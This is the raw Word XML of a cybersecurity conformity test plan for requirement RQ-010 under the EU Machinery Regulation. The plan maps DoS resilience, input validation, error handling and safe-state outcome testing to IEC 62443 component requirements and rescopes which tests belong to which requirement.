    <w:p w14:paraId="7F387EFC" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="207D1608" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64566A13" w14:textId="77777777" w:rsidR="007D03A4" w:rsidRDefault="007D03A4" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A7B5DE2" w14:textId="77777777" w:rsidR="00576380" w:rsidRDefault="00576380" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BF52DED" w14:textId="77777777" w:rsidR="00576380" w:rsidRDefault="00576380" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="078B2A6A" w14:textId="77777777" w:rsidR="00576380" w:rsidRDefault="00576380" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EDFC922" w14:textId="77777777" w:rsidR="007D03A4" w:rsidRDefault="007D03A4" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36B32F8E" w14:textId="5D1A7363" w:rsidR="008E6DD6" w:rsidRPr="00C1714F" w:rsidRDefault="008E6DD6" w:rsidP="008E6DD6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lastRenderedPageBreak/>
        <w:t xml:space="preserve">REQUIREMENT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:u w:val="double"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58BE2C07" w14:textId="77777777" w:rsidR="007D03A4" w:rsidRDefault="007D03A4" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49580061" w14:textId="77777777" w:rsidR="008E6DD6" w:rsidRDefault="008E6DD6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="782241AF" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00991EFB" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-010 — Reprocessed (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553EDAE6" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Correction applied:</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-010 is the </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>capstone synthesis</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> requirement, so the recheck is about confirming it correctly </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the tests deferred from RQ-001 and RQ-007, and that its own reach into other requirements is properly </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cross-referenced rather than re-mapped</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:t xml:space="preserve">Two </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>corrections</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67607B00" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00991EFB" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Receives the deferred DoS/flood work (correct home).</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> The generalized flooding/DoS tests deferred from </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-001</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (I re-scoped RQ-001 to </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>connecting-device integrity</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, sending flood/DoS here) and from </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-007</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (I re-scoped RQ-007 to </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>inherent availability + the self-DoS</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, sending generalized flooding here) </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>land in RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>. This is their correct destination — RQ-010 is exactly "withstand reasonably foreseeable malicious attempts."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B5B99D8" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00991EFB" w:rsidRDefault="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/firmware and spoofing reach-ins must be cross-references, not primary mappings.</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> My original RQ-010 pulled in </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 3.5/3.6/3.7</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (input validation / deterministic output / error handling) as </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>primary</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — which is correct, RQ-010 legitimately spans FRs — but it also treated the </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">unsigned-firmware </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RQ-005)</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>spoofing aggregate (RQ-001/004/006)</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> as if RQ-010 </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>tests</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> them. It should </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cross-reference</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> those (RQ-005 tests the firmware protection; RQ-001 tests connecting-device spoofing) and consume their </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>results</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> only in the </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>outcome-verification</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> harness. I tighten this so RQ-010 does not duplicate RQ-005/RQ-001 tests but </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>aggregates their outcomes</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> against the EHSR success criterion.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0429F46D" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00991EFB" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Everything else — the asset-label fix (Asset B→H), the black-channel-as-primary-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>defence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, Net Load Class III credit, and the two residual findings (repeated-passivation availability; unsigned-firmware exception) — was correct and is retained.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58929DF0" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:pict w14:anchorId="382790FD">
          <v:rect id="_x0000_i1681" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC1DDB4" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00991EFB" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 1 — Critical Review &amp; Theoretical Validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2762E9E1" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00991EFB" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.1 Requirement &amp; CR Mapping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B32C04" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00991EFB" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">EU Machinery Regulation (EU) 2023/1230, Annex III </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EHSR 1.1.9 §3</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>withstand reasonably foreseeable malicious attempts… that could lead to a hazardous situation.</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Outcome-based</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: success = the attack </w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>resolves to the safe state</w:t>
      </w:r>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not that it is prevented. This is the one requirement that legitimately spans multiple </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00991EFB">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>FRs.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924"/>
        <w:gridCol w:w="1463"/>
        <w:gridCol w:w="4605"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="239F52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AC4FAD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79587E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Your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44BFE6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82CA80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Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00991EFB" w14:paraId="4857A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786AA" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">CR 7.1(1) – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>DoS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protection</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (RE1)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5E92C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F066A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t>Correct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primary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5EAA6" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00991EFB" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00991EFB">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Receives the flood/DoS work deferred from RQ-001/RQ-007.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="1F6F3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DE950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CR 7.2 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Resource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t>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C9826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Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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5CDD5" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357"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65107" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">Flood </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>resilience</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>resource</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>-management.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00AC6357" w14:paraId="583D0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C9167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CR 3.5 – Input </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs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2D596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Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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8CC09" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">Keep — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>decisive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for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fuzzing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8485E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t>Malformed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> PROFINET/DCP/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>PROFIsafe</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve">/HTTP </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>robustness</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="4BDCD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51BB3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CR 3.7 – Error </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>handling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474E5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Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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57159" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357"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A3C6D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Handle malformed/unexpected input without an undefined (hazardous) state.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="09C013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BED83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 xml:space="preserve">CR 3.6 – Deterministic </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>output on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3AB6E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Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC635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48A15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Keep — </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>the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t>outcome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lastRenderedPageBreak/>
              <w:t>anchor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2096A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lastRenderedPageBreak/>
              <w:t xml:space="preserve">The CR that actually satisfies the EHSR: any attack → defined safe state (Low, qualifier </w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>bad).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w14:paraId="01809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3A544" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00D73D4E" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="sv-SE"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="sv-SE"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>IEC 62443-4-1 SVV-3/SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="sv-SE"/>
              </w:rPr>
              <w:t xml:space="preserve"> (process </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="sv-SE"/>
              </w:rPr>
              <w:t>anchor</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D73D4E">
              <w:rPr>
                <w:lang w:val="sv-SE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7F1B9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Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>➕</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:t>note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1461B" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357"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B7C68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"Reasonably foreseeable malicious attempts" = the 4-1 vuln + penetration mandate.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C85CCBB" w14:textId="77777777" w:rsidR="00AC6357" w:rsidRPr="00AC6357" w:rsidRDefault="00AC6357" w:rsidP="00AC6357">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D73D4E">
        <w:rPr>
